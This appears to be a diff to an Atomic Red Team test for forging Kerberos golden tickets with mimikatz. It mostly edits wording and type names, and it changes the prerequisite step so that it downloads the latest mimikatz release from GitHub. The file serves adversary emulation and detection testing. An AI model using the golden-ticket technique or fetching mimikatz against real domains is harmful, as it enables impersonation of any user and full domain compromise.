@@ -1,10 +1,10 @@
 attack_technique: T1558.001
 display_name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
 atomic_tests:
-- name: Crafting golden tickets with mimikatz
+- name: Crafting Active Directory golden tickets with mimikatz
   auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
   description: |
-    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
+    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
     This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
     The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
   supported_platforms:
@@ -12,23 +12,23 @@ atomic_tests:
   input_arguments:
     domain_sid:
       description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
-      type: string
+      type: String
       default: S-1-5-21-DEFAULT
     domain:
-      description: Targeted domain FQDN
-      type: string
+      description: Targeted Active Directory domain FQDN
+      type: String
       default: example.com
     account:
       description: Account to impersonate
-      type: string
+      type: String
       default: goldenticketfakeuser
     krbtgt_aes256_key:
       description: Krbtgt AES256 key
-      type: string
+      type: String
       default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
     mimikatz_path:
       description: Mimikatz windows executable
-      type: path
+      type: Path
       default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
   dependency_executor_name: powershell
   dependencies:
@@ -39,7 +39,8 @@ atomic_tests:
       if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
     get_prereq_command: |
       $mimikatz_path = cmd /c echo #{mimikatz_path}
-      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
       New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
       Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
